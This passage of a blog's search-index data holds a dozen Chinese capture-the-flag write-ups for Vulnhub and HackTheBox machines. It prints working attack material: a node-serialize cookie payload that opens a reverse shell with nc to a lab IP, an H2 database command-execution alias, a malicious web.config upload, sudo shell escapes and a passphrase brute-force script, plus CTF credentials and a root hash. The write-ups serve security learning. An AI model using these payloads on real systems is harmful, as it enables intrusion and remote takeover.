flag.typhoon.local.\t3600\tIN\tTXT\t\u0026quot;g00d_j0b_typh00n!\u0026quot;\n4. Web calendar 注意改一下hosts calendar.typhoon.local指向虚拟机ip 弱密码admin:admin 找洞 直接日 拿到shell\n5. Lotus CMS 找洞直接日 直接用就行 6. Drupal CMS 也是找洞直接日 7. POP3 不会日 占坑\n8. SMB smbmap加用户凭据 可以翻文件 9. Redis 未授权访问 直接写webshell 10. CUPS 某个打印服务 找洞直接日 11. PostgreSQL 占坑 不会日\n12. NFS 发现一个私钥和flag 私钥读不出来。。。 占坑 13. Tomcat tomcat:tomcat直接登录 传shell即可 14. Struts 2 S2-045 http://flag.typhoon.local:8080/struts2-rest-showcase/orders/3 http://flag.typhoon.local:8080/struts2-showcase/showcase.action 得到shell\n15. SSH 直接爆破  拿到shell了 内核很低 内核提取即可 拿这个脚本提也行 ","id":33,"section":"posts","summary":"扫端口 卧槽，，， 太长了。。。 先看80 有个/mongoadmin/目录 去看看 什么鬼。。。没认证 得到一个凭据typhoon:789456123 接","tags":["vulnhub"],"title":"[Vulnhub] typhoon - Writeup","uri":"https://naivekun.com/2018/12/vulnhub-typhoon-wp/","year":"2018"},{"content":"超级脑洞盒子 扫端口 先看80 主页没啥 robots.txt看看 读取flag1 提示9072 正好刚才扫端口发现9072端口 nc连上去看看 试了几下，只能运行两次 直接反弹meterpreter 拿到。。。root\n 另一条路是读取那个哈希，然后拿根目录那个字典去爆破，得到blacklight的密码\n 翻文件 发现blacklight用户目录下有.secret文件夹 里面是个图片。。。 mdzz，是个隐写 binwalk没结果。。。 猜测一下出题人的意图 看看.bash_history outguess是什么东西？？？ 原来是个隐写工具 直接把图片丢进去就行 拿到第二个flag和提示 这串字符怎么解密？？？ 这是本盒子最脑洞的地方 A?B?应该是二进制 然而8个一组貌似不行。。。 注意到。。。五个一组貌似可以 写成1和0 转成10进制 注意到这些数字都没有超过26 那么0是A，1是B\u0026hellip; 试试 这。。。什么鬼？？？ 脑洞地方来了！！！ 把刚才的2进制转成9进制 read etc bacon 那么我们cat /etc/bacon 得到最后一个flag 当然你也可以暴力grep -r ","id":34,"section":"posts","summary":"超级脑洞盒子 扫端口 先看80 主页没啥 robots.txt看看 读取flag1 提示9072 正好刚才扫端口发现9072端口 nc连上去看看 试了几下，只","tags":["vulnhub"],"title":"[Vulnhub] BLACKNIGHT - Writeup","uri":"https://naivekun.com/2018/12/vulnhub-blacknight-wp/","year":"2018"},{"content":"信息收集 开了pop3和imap端口。。。 还是先看web吧 大概是。。。被日了 敏感信息还被挂到了Twitter上。。。 去Twitter看看@fowsniffcorp 看看那个pastebin\nFOWSNIFF CORP PASSWORD LEAK\r''~``\r( o o )\r+-----.oooO--(_)--Oooo.------+\r| |\r| FOWSNIFF |\r| got |\r| PWN3D!!! |\r| | | .oooO | | ( ) Oooo. | +---------\\ (----( )-------+\r\\_) ) /\r(_/\rFowSniff Corp got pwn3d by B1gN1nj4!\rNo one is safe from my 1337 skillz!\rmauer@fowsniff:8a28a94a588a95b80163709ab4313aa4\rmustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56\rtegel@fowsniff:1dc352435fecca338acfd4be10984009\rbaksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb\rseina@fowsniff:90dc16d47114aa13671c697fd506cf26\rstone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd\rmursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b\rparede@fowsniff:4d6e42f56e127803285a0a7649b5ab11\rsciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e\rFowsniff Corporation Passwords LEAKED!\rFOWSNIFF CORP PASSWORD DUMP!\rHere are their email passwords dumped from their databases.\rThey left their pop3 server WIDE OPEN, too!\rMD5 is insecure, so you shouldn't have trouble cracking them but I was too lazy haha =P\rl8r n00bz!\rB1gN1nj4\r-------------------------------------------------------------------------------------------------\rThis list is entirely fictional and is part of a Capture the Flag educational challenge.\rAll information contained within is invented solely for this purpose and does not correspond\rto any real persons or organizations.\rAny similarities to actual people or entities is purely coincidental and occurred accidentally.\r 解密那些md5\nailcall\rbilbo101\rapples01\rskyler22\rscoobydoo2\rcarp4ever\rorlando12\r07011972\r hydra爆破pop3 拿这个凭据登录邮件服务 翻邮件 另外一封不挂出来了，没啥东西 大概意思是所有人的初始密码是S1ck3nBluff+secureshell 可能有人没改？？？ 用之前泄露的用户名 hydra爆破 登录 看一下内核 直接内核提权就行-\u0026gt;传送门 拿到flag ","id":35,"section":"posts","summary":"信息收集 开了pop3和imap端口。。。 还是先看web吧 大概是。。。被日了 敏感信息还被挂到了Twitter上。。。 去Twitter看看@fo","tags":["vulnhub"],"title":"[Vulnhub] Fowsniff - Writeup","uri":"https://naivekun.com/2018/12/vulnhub-fowsniff-wp/","year":"2018"},{"content":"扫端口，有个奇怪的8888端口。。。 先从web入手 试试几个功能，抓包看看 发现这几个功能 尝试读源码 好难受。。。丢进python print一下 发现\n\u0026lt;?php\rif($_SERVER['REQUEST_METHOD'] === \u0026quot;POST\u0026quot;){\r$fileContent['file'] = false;\rheader('Content-Type: application\\/json');\rif(isset($_POST['file'])){\rheader('Content-Type: application\\/json');\r$_POST['file'] = str_replace( array(\u0026quot;..\\/\u0026quot;, \u0026quot;..\\\u0026quot;\u0026quot;), \u0026quot;\u0026quot;, $_POST['file']);\rif(strpos($_POST['file'], \u0026quot;user.txt\u0026quot;) === false){\r$file = fopen(\u0026quot;\\/var\\/www\\/html\\/\u0026quot; . $_POST['file'], \u0026quot;r\u0026quot;);\r$fileContent['file'] = fread($file,filesize($_POST['file']));\rfclose();\r}\r}\recho json_encode($fileContent);\r}\r 发现只替换了一次../ dirRead.php差不多 通过双写../绕过，翻文件 读到ssh私钥 ssh登陆 得到user.txt 收集一下信息 woc我好像在docker里 注意到之前的8888端口 看一下本机的 注意到在外面连22和在docker里连22不是一个ssh docker里面的ssh监听的是8888 推测网络结构是这样的 我们直接从docker里面连接主机的22端口 就用之前的公钥，用户换成monitor 是个受限的rbash 发现ed可以用 拿gtfobins搜搜 即可绕过rbash 顺手修一下PATH 把kali的粘贴进去就行 然后开始提权 4.9的内核。。。不行 suid。。。没有 看到了这个东西-\u0026gt;传送门 其实就是拆分root权限，只对应用程序赋一部分root的能力 发现tac可以以root权限读取文件 读flag即可 ","id":36,"section":"posts","summary":"扫端口，有个奇怪的8888端口。。。 先从web入手 试试几个功能，抓包看看 发现这几个功能 尝试读源码 好难受。。。丢进python print一下 发","tags":["HackTheBox"],"title":"[HackTheBox] Waldo - WriteUp","uri":"https://naivekun.com/2018/12/htb-waldo-wp/","year":"2018"},{"content":"是个辣鸡windows 无从下手.jpg 先从445入手 ms17什么的不用想了，这盒子不可能这么水 smbmap看看有什么可以访问的 发现Replication文件夹只读 匿名登陆，翻文件 发现Groups.xml 这是Win Server2008 的GPP漏洞 详细解析见-\u0026gt;传送门 打开看看 得到用户active.htb\\SVC_TGS 还有一个密码 关键是，这个密码不是哈希，而是。。。AES 而且微软公布了密钥。。。 直接解密就行 密码是GPPstillStandingStrong2k18 拿这个凭据，接着用smbmap看看共享 users可读 进去看看 找到user.txt 下面开始搞Administrator 首先学习一下windows域渗透知识 kerberoast攻击 用GetUserSPNs读取Administrator密码哈希 hashcat跑一下 秒出结果 拿账号密码登陆即可拿到root.txt\n","id":37,"section":"posts","summary":"是个辣鸡windows 无从下手.jpg 先从445入手 ms17什么的不用想了，这盒子不可能这么水 smbmap看看有什么可以访问的 发现Repli","tags":["HackTheBox"],"title":"[HackTheBox] Active - WriteUp","uri":"https://naivekun.com/2018/12/htb-active-wp/","year":"2018"},{"content":"扫端口 ftp允许匿名登录 列文件，发现 把那个.drupal.txt.enc下载下来，发现是一个加密的文件 网上找到个工具 bruteforce-salted-openssl 直接apt安装就行 翻翻man，选好参数 bruteforce-salted-openssl -t 10 -f /usr/share/wordlists/rockyou.txt -d sha256 drupal.raw 这里有一个坑。。。网上的神仙用神奇的方法判断加密方式。。。 大概是根据aes加密会padding成2的整数倍，利用这个特性，加密无意义的，2的整数倍的长度的文件，判断加密后的长度和.drupal.txt.enc长度是否一样，从而判断加密方式。。。 我是瞎试的。。。 bruteforce-salted-openssl默认的加密方式就是对的。。。 摘要方式默认是md5，瞎胡试试，发现sha256可以。。。\n秒出结果 使用openssl解密 openssl enc -aes-256-cbc -d -in drupal.raw -k friends -out text.txt 得到text.txt 现在知道了用户名daniel，密码PencilKeyboardScanner123 再看看web 瞎胡试密码 admin:admin daniel:PencilKeyboardScanner123 admin:PencilKeyboardScanner123 使用admin:PencilKeyboardScanner123成功登录后台 所以drupal咋日。。。 google一下 发现drupal有个插件叫php filter 。。。 这不就是个eval嘛 点Preview就运行自己写的php代码了 。。。 msf打开web_delivery 反弹得到meterpreter 翻网站配置文件，得到数据库配置 准备提权 这提个锤子。。。 suid没东西 计划任务没东西 权限很死 倒是可以读user.txt 准备提权 看端口 8082有个h2数据库控制台 而且这个h2数据库是拿root跑的。。。 google一下发现就是java版的mysql 浏览器访问一下 那就端口转发 meterpreter portfwd即可 这里有个坑。。。 meterpreter转发不稳定。。。半分钟就挂了。。。 用ssh好一些 拿已知的信息瞎胡试 用数据库配置文件找到的密码 daniel:drupal4hawk成功登录 ssh -L转发即可 用之前找到的数据库凭据登录 exp db找找这个库的洞 发现-\u0026gt;传送门\nCREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026quot;\\\\A\u0026quot;); return s.hasNext() ? s.next() : \u0026quot;\u0026quot;; }$$;\rCALL SHELLEXEC('id')\r 运行sql语句，得到 直接读/root/root.txt就行 要是非得弄个shell回来，这个玄学sql没法转义。。。可以拿之前那个ssh在tmp下写反弹脚本，拿sql运行就行 另外这破盒子没nc没python 倒是有个python3 ","id":38,"section":"posts","summary":"扫端口 ftp允许匿名登录 列文件，发现 把那个.drupal.txt.enc下载下来，发现是一个加密的文件 网上找到个工具 bruteforce-salted-openssl 直接apt安装就行 翻翻","tags":["HackTheBox"],"title":"[HackTheBox] Hawk - WriteUp","uri":"https://naivekun.com/2018/12/htb-hawk-wp/","year":"2018"},{"content":"扫端口 太长了，截图放不下\nPORT STATE SERVICE VERSION\r22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)\r| ssh-hostkey: | 2048 5f:bf:c0:33:51:4f:4a:a7:4a:7e:15:80:aa:d7:2a:0b (RSA)\r| 256 53:59:87:1e:a4:46:bd:a7:fd:9a:5f:f9:b7:40:9d:2f (ECDSA)\r|_ 256 0d:88:d9:fa:af:08:ce:2b:13:66:a7:70:ec:49:02:10 (ED25519)\r80/tcp open http Apache httpd 2.4.25 ((Debian))\r| http-methods: |_ Supported Methods: OPTIONS HEAD GET POST\r| http-robots.txt: 1 disallowed entry |_/\r|_http-server-header: Apache/2.4.25 (Debian)\r|_http-title: MOONRAKER\r3000/tcp open http Node.js Express framework\r| http-auth: | HTTP/1.1 401 Unauthorized\\x0D\r|_ Basic realm=401\r| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS\r|_http-title: Site doesn't have a title (text/html; charset=utf-8).\r4369/tcp open epmd Erlang Port Mapper Daemon\r| epmd-info: | epmd_port: 4369\r| nodes: |_ couchdb: 34327\r5984/tcp open couchdb?\r| fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 Object Not Found\r| Cache-Control: must-revalidate\r| Connection: close\r| Content-Length: 58\r| Content-Type: application/json\r| Date: Fri, 30 Nov 2018 13:10:17 GMT\r| Server: CouchDB/2.2.0 (Erlang OTP/19)\r| X-Couch-Request-ID: 28fe538d42\r| X-CouchDB-Body-Time: 0\r| {\u0026quot;error\u0026quot;:\u0026quot;not_found\u0026quot;,\u0026quot;reason\u0026quot;:\u0026quot;Database does not exist.\u0026quot;}\r| GetRequest: | HTTP/1.0 200 OK\r| Cache-Control: must-revalidate\r| Connection: close\r| Content-Length: 164\r| Content-Type: application/json\r| Date: Fri, 30 Nov 2018 13:09:24 GMT\r| Server: CouchDB/2.2.0 (Erlang OTP/19)\r| X-Couch-Request-ID: 436fb4695f\r| X-CouchDB-Body-Time: 0\r| {\u0026quot;couchdb\u0026quot;:\u0026quot;Welcome\u0026quot;,\u0026quot;version\u0026quot;:\u0026quot;2.2.0\u0026quot;,\u0026quot;git_sha\u0026quot;:\u0026quot;2a16ec4\u0026quot;,\u0026quot;features\u0026quot;:[\u0026quot;pluggable-storage-engines\u0026quot;,\u0026quot;scheduler\u0026quot;],\u0026quot;vendor\u0026quot;:{\u0026quot;name\u0026quot;:\u0026quot;The Apache Software Foundation\u0026quot;}}\r| HTTPOptions: | HTTP/1.0 500 Internal Server Error\r| Cache-Control: must-revalidate\r| Connection: close\r| Content-Length: 61\r| Content-Type: application/json\r| Date: Fri, 30 Nov 2018 13:09:24 GMT\r| Server: CouchDB/2.2.0 (Erlang OTP/19)\r| X-Couch-Request-ID: 74ac865d08\r| X-Couch-Stack-Hash: 1828508689\r| X-CouchDB-Body-Time: 0\r|_ {\u0026quot;error\u0026quot;:\u0026quot;unknown_error\u0026quot;,\u0026quot;reason\u0026quot;:\u0026quot;badarg\u0026quot;,\u0026quot;ref\u0026quot;:1828508689}\r34327/tcp open unknown\r 开了ssh 开了80 开了个3000端口的Node.js 开了个CouchDB。。。2.2版，没洞。。。2.1之前有任意用户创建的洞 先看看80吧 打开是个影片 然后跳到一个网页 先了解一下这个电影的背景信息\n 007之太空城 Moonraker (1979) 007之太空城的剧情简介 · · · · · · 从美国运送英国太空船半途失去了行踪，这引起了美英两国的高度重视，于是英过军方派出了007邦德（罗杰•摩尔 Roger Moore 饰）前去追查。经过调查，007发现了这件事背后后隐藏的另一个阴谋。世界上某个组织正在在制造一种神经麻痹气体，该气体是由一种极稀有的尼格拉兰花提取出来的；当邦德在这种兰花的产地详细调查后，一个足以震惊世界的大阴谋浮出了水面。原来，该组织已经在太空中建立了一个太空城，为了称霸世界，他们准备从太空城中发射50个自行研制毒气弹袭击地球上的50个大城市。邦德发现他们的阴谋后，准备飞上太空组织他们这个疯狂的计划！ ©豆瓣\n 挺有意思 提交？报名信息？ 貌似没啥洞啊。。。 怼个XSS上去，beef启动 把payload丢进去，提示管理员会在五分钟之内看？？？ 这会时间看看别的东西 3000端口的http需要认证。。。 CouchDB要账号和密码。。。 扫目录无果。。。 翻源码无果。。。 等等吧\n 等一会，XSS打回来了 woc这啥垃圾后端，cookies都不带 转到/svc-inq/salesmoon-gui.php看看 第一个没东西 第二个发现 什么鬼，这电影我没看过啊。。。 我咋知道它gf叫啥 我又没有 Wiki启动 https://en.wikipedia.org/wiki/Moonraker_(film) 叫Dolly\n下面还有个按钮，里面是这些东西\nFYI Hugo's custom page is being rebuilt over on the NodeJS server running on port 3000. Here's a snippet of the backend code for cookie input..this is once you get past the Username/password prompt.\rThe dev team is still creating most of the front end, but we will have to \u0026quot;secure the code\u0026quot; since we're now not only tasked with sales, but also secure code review. How do they expect to offer all of these extra services without hiring more ppl? Never thought I'd be a nerdy \u0026quot;coder\u0026quot;!\rHere's the snippet, you'll need nodejs and other stuff to run. It looks good to me so I've pushed to prod...\r//Stuff to import\rvar express = require('express');\rvar cookieParser = require('cookie-parser');\rvar escape = require('escape-html');\rvar serialize = require('node-serialize');\rvar app = express();\r// Here's the function they want reviewed...\r// I think it decodes the weird cookie string and runs it, prints it, sets it or idk.\rapp.get('/', function(req, res) {\rif (req.cookies.profile) {\rvar str = new Buffer(req.cookies.profile, 'base64').toString();\rvar obj = serialize.unserialize(str);\rif (obj.username) {\rres.send(\u0026quot;Stuff here then print out username.. \u0026quot; + escape(obj.username)\u0026quot;);\r}\r} else {\rres.cookie('profile', \u0026quot;eyJ1c2VybmFtZSI6Imh1Z28ifQ==\u0026quot;, {\rmaxAge: 900000,\rhttpOnly: true\r});\r}\r});\rapp.listen(3000);\r node-serialize明摆着的反序列化。。。\n回顾一下之前收集的信息 3000端口有个登录 CouchDB有个登录 使用凭据jaws:dollyx99 成功登录 翻数据库 里面没东西 这是个。。。监控？ 接着翻 Offer letter里面有。。。用户名和密码 拿这些凭据尝试登录3000端口，发现用户hugo成功登录 结合之前发现的源码，准备抓包，搞RCE Burpsuite启动 {\u0026quot;username\u0026quot;:\u0026quot;_$$ND_FUNC$$_function (){require(\\\u0026quot;child_process\\\u0026quot;).exec(\\\u0026quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 192.168.20.146 4442 \u0026gt;/tmp/f\\\u0026quot;)}()\u0026quot;} 怼进cookies 打开监听 得到一个shell 准备提权 内核是4.9 suid没东西 计划任务，sudoers没东西 看看.bash_history 发现local.ini find找找，发现是CouchDB的配置文件 cat出来看看 su hugo 成功跳到hugo用户 翻翻邮件\nFrom moonrakertech@moonraker.localdomain Fri Oct 5 19:11:17 2018\rReturn-Path: \u0026lt;moonrakertech@moonraker.localdomain\u0026gt;\rX-Original-To: hugo@moonraker.localdomain\rDelivered-To: hugo@moonraker.localdomain\rReceived: by moonraker.localdomain (Postfix, from userid 1003)\rid 81CA720405; Fri, 5 Oct 2018 19:11:17 -0400 (EDT)\rTo: hugo@moonraker.localdomain\rSubject: RE:Root Access\rMIME-Version: 1.0\rContent-Type: text/plain; charset=\u0026quot;UTF-8\u0026quot;\rContent-Transfer-Encoding: 8bit\rMessage-Id: \u0026lt;20181005231117.81CA720405@moonraker.localdomain\u0026gt;\rDate: Fri, 5 Oct 2018 19:11:17 -0400 (EDT)\rFrom: moonrakertech@moonraker.localdomain\rMr. Hugo Drax, I don't care if you're the president of the United States, You will need to create a ticket for this request. Do you not understand the IT request process or do we need to require more mandatory online training?\rFrom moonrakertech@moonraker.localdomain Fri Oct 5 19:39:51 2018\rReturn-Path: \u0026lt;moonrakertech@moonraker.localdomain\u0026gt;\rX-Original-To: hugo@moonraker.localdomain\rDelivered-To: hugo@moonraker.localdomain\rReceived: by moonraker.localdomain (Postfix, from userid 1003)\rid DEF0A20410; Fri, 5 Oct 2018 19:39:51 -0400 (EDT)\rTo: hugo@moonraker.localdomain\rSubject: RE:RE:RE:Root Access\rMIME-Version: 1.0\rContent-Type: text/plain; charset=\u0026quot;UTF-8\u0026quot;\rContent-Transfer-Encoding: 8bit\rMessage-Id: \u0026lt;20181005233951.DEF0A20410@moonraker.localdomain\u0026gt;\rDate: Fri, 5 Oct 2018 19:39:51 -0400 (EDT)\rFrom: moonrakertech@moonraker.localdomain\rHugo...I'm being given a reward huh? Finally some well deserved recognition! Also this better come with a bump in pay otherwise I'm not afraid to give you a piece of my mind! See you outside of the Decompression Chamber shortly as per your request...I'm expecting the Award to be in hand as I don't like to get up from me desk.\rAlso your ticket has been complete. Since I'm feeling nice today, I'm including the password here in its native hash and not in the ticket. BTW this is the old password hash, the new one is the same + \u0026quot;VR00M\u0026quot; without quotes.\rHave fun with the decryption process \u0026quot;Boss\u0026quot;! Haha!\rroot:$6$auLf9y8f$qgi63MGYQGnnk6.6ktcZIMpROPMqMXMEM7JufH1aTIApIPIZZu7yRjfIcZ1pELNoeMM7sIwCrVmMCjNYJRRGf/:17809:0:99999:7:::\rFrom hr@moonraker.localdomain Fri Oct 5 20:24:20 2018\rReturn-Path: \u0026lt;hr@moonraker.localdomain\u0026gt;\rX-Original-To: hugo@moonraker.localdomain\rDelivered-To: hugo@moonraker.localdomain\rReceived: by moonraker.localdomain (Postfix, from userid 1000)\rid 2412120452; Fri, 5 Oct 2018 20:24:20 -0400 (EDT)\rTo: hugo@moonraker.localdomain\rSubject: Decompression Accident\rMIME-Version: 1.0\rContent-Type: text/plain; charset=\u0026quot;UTF-8\u0026quot;\rContent-Transfer-Encoding: 8bit\rMessage-Id: \u0026lt;20181006002420.2412120452@moonraker.localdomain\u0026gt;\rDate: Fri, 5 Oct 2018 20:24:20 -0400 (EDT)\rFrom: hr@moonraker.localdomain\rMr. Hugo, since you were a witness to Moonrakertech's accident, you'll have to write up a statement. Just stick to the basics like we talked about. Jaws deleted the camera footage, and there were no witnesses.  得到root的哈希 john跑一下 所以root:cyberVR00M 成功登录 拿到flag ","id":39,"section":"posts","summary":"扫端口 太长了，截图放不下 PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0) | ssh-hostkey: | 2048 5f:bf:c0:33:51:4f:4a:a7:4a:7e:15:80:aa:d7:2a:0b (RSA) | 256 53:59:87:1e:a4:46:bd:a7:fd:9a:5f:f9:b7:40:9d:2f (ECDSA) |_ 256 0d:88:d9:fa:af:08:ce:2b:13:66:a7:70:ec:49:02:10 (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-methods: |_ Supported Methods: OPTIONS HEAD GET POST | http-robots.txt: 1 disallowed entry |_/ |_http-server-header: Apache/2.4.25 (Debian) |_http-title: MOONRAKER 3000/tcp open http Node.js","tags":["vulnhub"],"title":"[Vulnhub] Moonraker:1 - Writeup","uri":"https://naivekun.com/2018/11/vulnhub-moonraker-wp/","year":"2018"},{"content":"看看端口 就开了个80和22 懒得放图\n从web入手 打开网页，提示需要登录 是个basic认证 错误信息提示用户名是Bob 毕竟其他神奇的语言看不懂。。。 那么48.4 -0.466667是什么玄学？ 像是？？？ GPS坐标！ 打开地图 红点是哪个坐标 找最近的城市 Le Horps 我们试试\nle-horps\rLe-Horps\rlehorps\rLeHorps\r...\r 发现密码是LeHorps 进入网站 是个博客？ robots.txt发现flag 发现一个自己写的垃圾搜索 sqlmap怼上去 有个表叫ssh_keys 拉下来 是个私钥 拿用户名alice登录ssh 在目录下发现第三个flag 第二个呢？ 网站根目录grep -r看看。。。没有 猜测在数据库里 从网站配置文件翻翻数据库账号和密码 mysqldump导出，grep一下看看 得到第二个flag\n开始提权 crontab没东西 内核是4.9。。。没戏 setuid有个mount 但是sudo没密码 sudoers发现： 利用awk sudo awk 'BEGIN {system(\u0026quot;/bin/sh\u0026quot;)}' 即可得到root 拿到第四个flag\n","id":40,"section":"posts","summary":"\u003cp\u003e看看端口\n就开了个80和22\n懒得放图\u003c/p\u003e\n\u003cp\u003e从web入手\n打开网页，提示需要登录\n\u003cimg src=\"https://naivekun.com/images/1543319056230.png\" alt=\"image\"\u003e\u003c/p\u003e","tags":["vulnhub"],"title":"[Vulnhub] CTF-KIOFan - WriteUp","uri":"https://naivekun.com/2018/11/ctf-kiofan-wp/","year":"2018"},{"content":" 挺好的盒子，学到很多新东西\n nmap开路 看看rpc信息 开了个nfs 在线学习一波nfs渗透技术 showmount -e \u0026lt;ip\u0026gt; 得到 挂载这个共享文件 看到有个7z 下载下来，发现有密码 网上找找。。。好像没啥工具能搞7z（这个压缩包本身没有加密，里面的文件被加密了。。。很麻烦） 找了个在线网站 解压，看看有啥东西 图片啥都没有 有个公钥，私钥 公钥结尾的数据 再结合之前nfs的路径/home/user/storage 猜测用户是user ssh登录一下 ??? 私钥有密码？？？ john 启动 \u0026hellip; 不支持这个奇怪的openssh 只支持BEGIN RSA PRIVATE KEY \u0026hellip; 然而openssh私钥转换成rsa私钥需要密码。。。 mdzz 注意到ssh-keygen对私钥操作时有带密码的选项。 写个脚本爆破\n#!/bin/bash\rfor line in `cat /usr/share/wordlists/fasttrack.txt`\rdo\rif ssh-keygen -c -C \u0026quot;naivekun\u0026quot; -P $line -f key.txt\rthen\recho $line\rfi\rdone\r -c是改注释 拿系统自带的字典跑一下 得到私钥密码：12345678 登录 开始提权 openbsd??? 貌似没有内核提权。。。 crontab没东西 看看suid find / -perm -u+s 发现这个东西 看看配置文件/etc/doas.conf 有个less 运行doas /usr/bin/less /var/log/authlog 按v进入vi模式 :!sh即可 搞定 作者还送了两个破解7z和ssh私钥密码的命令\n","id":41,"section":"posts","summary":"\u003cblockquote\u003e\n\u003cp\u003e挺好的盒子，学到很多新东西\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003enmap开路\n\u003cimg src=\"https://naivekun.com/images/1543229863106.png\" alt=\"image\"\u003e\u003c/p\u003e","tags":["vulnhub"],"title":"[Vulnhub] FourAndSix: 2.01 - WriteUp","uri":"https://naivekun.com/2018/11/untitled-1543229695957/","year":"2018"},{"content":"看题知漏洞\n扫端口 就开了个80 主页是apache默认页面 robots.txt有点东西 访问/xxe 发现是个登陆框。。。\n抓包 是个xml格式的数据 上xxe payload 可以读/etc/passwd 还有网站源码 硬编码用户名和密码 解密那个md5，得到密码admin@123 进后台\nJQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5 这个咋整。。。 脑洞 一次base32 得到L2V0Yy8uZmxhZy5waHA= 一次base64 得到/etc/.flag.php 所以flag在/etc/.flag.php 读出来看看 看起来。。。像php? 跑一下 拿到flag SAFCSP{xxe_is_so_easy}\n","id":42,"section":"posts","summary":"\u003cp\u003e看题知漏洞\u003c/p\u003e\n\u003cp\u003e扫端口\n就开了个80\n主页是apache默认页面\nrobots.txt有点东西\n\u003cimg src=\"https://naivekun.com/images/1542631410979.png\" alt=\"image\"\u003e\n访问\u003ccode\u003e/xxe\u003c/code\u003e\n发现是个登陆框。。。\u003c/p\u003e","tags":["vulnhub"],"title":"[Vulnhub] XXE Lab:1 - WriteUp","uri":"https://naivekun.com/2018/11/vulnhub-xxe-lab/","year":"2018"},{"content":"懒得写目录\n扫端口，记得加-p- 80看了看，没东西 31337端口上也有个类似的网页。\n看源码，发现 解密，得到\necho \u0026quot;Then you'll see, that it is not the spoon that bends, it is only yourself. \u0026quot; \u0026gt; Cypher.matrix\r 提示有文件Cypher.matrix，到根目录看看，下载下来。 发现是brainfuck 找个网页解码 告诉我们用户名是guest 密码是k1ll0r+两个字符 生成字典，hydra爆破即可 得到密码，登陆\n发现是一个受限的shell 网上查查怎么绕过 echo可用 vi可用 拿vi运行:!/bin/bash即可绕过受限的shell sudo -l看看 发现PATH变量坏了。。。 自己改一下 export PATH='/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' 直接sudo su即可 拿到flag ","id":43,"section":"posts","summary":"\u003cp\u003e\u003cdel\u003e懒得写目录\u003c/del\u003e\u003c/p\u003e\n\u003cp\u003e扫端口，记得加\u003ccode\u003e-p-\u003c/code\u003e \n\u003cimg src=\"https://naivekun.com/images/1542625117729.png\" alt=\"image\"\u003e\n80看了看，没东西\n31337端口上也有个类似的网页。\u003c/p\u003e","tags":["vulnhub"],"title":"[Vulnhub] Matrix:1 - WriteUp","uri":"https://naivekun.com/2018/11/vulnhub-matrix-wp/","year":"2018"},{"content":"0x01 Discovery 就开了个80 扫目录，发现这样一个东西 aspx的站，去看看\n0x02 Web Exploit 有个上传点 怼点东西上去\ntxt,aspx,asmx失败 只能传图片 拿burp测测文件后缀 直接改后缀没用 00截断直接报错。。。 intruder看一下 长度1350的应该就是可以上传的 可以传config!!! 网上查查，找个payload，传上去 传哪里了呢？ 看看扫目录的结果 传上去看看\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\r\u0026lt;configuration\u0026gt;\r\u0026lt;system.webServer\u0026gt;\r\u0026lt;handlers accessPolicy=\u0026quot;Read, Script, Write\u0026quot;\u0026gt;\r\u0026lt;add name=\u0026quot;web_config\u0026quot; path=\u0026quot;*.config\u0026quot; verb=\u0026quot;*\u0026quot; modules=\u0026quot;IsapiModule\u0026quot; scriptProcessor=\u0026quot;%windir%\\system32\\inetsrv\\asp.dll\u0026quot; resourceType=\u0026quot;Unspecified\u0026quot; requireAccess=\u0026quot;Write\u0026quot; preCondition=\u0026quot;bitness64\u0026quot; /\u0026gt; \u0026lt;/handlers\u0026gt;\r\u0026lt;security\u0026gt;\r\u0026lt;requestFiltering\u0026gt;\r\u0026lt;fileExtensions\u0026gt;\r\u0026lt;remove fileExtension=\u0026quot;.config\u0026quot; /\u0026gt;\r\u0026lt;/fileExtensions\u0026gt;\r\u0026lt;hiddenSegments\u0026gt;\r\u0026lt;remove segment=\u0026quot;web.config\u0026quot; /\u0026gt;\r\u0026lt;/hiddenSegments\u0026gt;\r\u0026lt;/requestFiltering\u0026gt;\r\u0026lt;/security\u0026gt;\r\u0026lt;/system.webServer\u0026gt;\r\u0026lt;/configuration\u0026gt;\r\u0026lt;!-- ASP code comes here! It should not include HTML comment closing tag and double dashes!\r\u0026lt;%\rResponse.write(\u0026quot;-\u0026quot;\u0026amp;\u0026quot;-\u0026gt;\u0026quot;)\r' it is running the ASP code if you can see 3 by opening the web.config file!\rResponse.write(1+2)\rResponse.write(\u0026quot;\u0026lt;!-\u0026quot;\u0026amp;\u0026quot;-\u0026quot;)\r%\u0026gt;\r--\u0026gt;\r 网页返回了3 说明有RCE\n但是并没有回显。。。 这样处理 cmd /c ping \u0026lt;my ip\u0026gt; 然后在本机tcpdump -i tun0 icmp 得到回显 说明恶意代码被执行了\n0x03 Privilege Escalation 介绍几个后渗透框架\nnishang 一个powershell后渗透工具\nmerlin 跨平台C\u0026amp;C工具\nunicorn powershell免杀工具\n 先占坑。。。 先拿msf瞎搞一波 use exploit/multi/script/web_delivery 主机和端口号改好，target选powershell。 生成payload 把powershell命令丢进刚才的shell里面 反弹！ 得到user.txt\n0x04 Privilege Escalation II use post/multi/recon/local_exploit_suggester 找提权工具 找到windows/local/ms16_014_wmi_recv_notif 提权 sessions -u 升级成meterpreter即可\n得到root.txt\n顺便抓一波用户名和密码。 ","id":44,"section":"posts","summary":"\u003ch3 id=\"0x01-discovery\"\u003e0x01 Discovery\u003c/h3\u003e\n\u003cp\u003e就开了个80\n扫目录，发现这样一个东西\n\u003cimg src=\"https://naivekun.com/images/1540816948276.png\" 